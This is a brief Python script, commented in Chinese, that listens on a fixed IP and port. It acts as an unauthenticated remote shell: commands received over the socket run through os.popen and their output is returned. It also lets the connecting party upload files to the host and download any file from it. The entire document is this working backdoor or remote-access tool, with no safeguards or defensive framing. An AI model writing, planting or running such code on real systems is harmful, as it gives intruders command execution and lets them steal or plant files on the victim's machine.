import socket
import os

HOST = "10.10.10.234"
POST = 5000
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
addr = (HOST,POST)
s.bind(addr)  #邦定ip地址和端口号
s.listen(1)
conn,addr = s.accept()

def getfile():
    conn.send(b"i have get file\r\n")
    filenameb = conn.recv(1024)
    filename = str(filenameb,encoding="gbk")
    fdata = conn.recv(1024) #接收文件数据
    with open(filename,"wb") as f:
        f.write(fdata)
    conn.send(b"finish")  #告诉对方接收完成

def sendfile():
    conn.send(b"i have sendfile\r\n")
    fileb = conn.recv(1024)
    file = str(fileb,encoding="gbk")
    with open(file,"rb") as f:
        fdata = f.read()
    conn.send(fdata)
    conn.send(b"finish")
def main(addr):
    print(addr) #对方主机地址
    while True:
        data = conn.recv(1024)
        print(data)
        if data == b"quit":
            break
        if data == b"sendfile":
            getfile()
            continue
        if data == b"getfile":
            sendfile()
            continue
        f = os.popen(str(data,encoding="gbk")) #命令的返回值赋值
        rdata = f.read()
        print(rdata)
        if rdata:
            conn.send(bytes(rdata,encoding="gbk"))
        else:
            conn.send(b'finish')

    conn.close()
    s.close()

if __name__ == "__main__":
    main(addr)
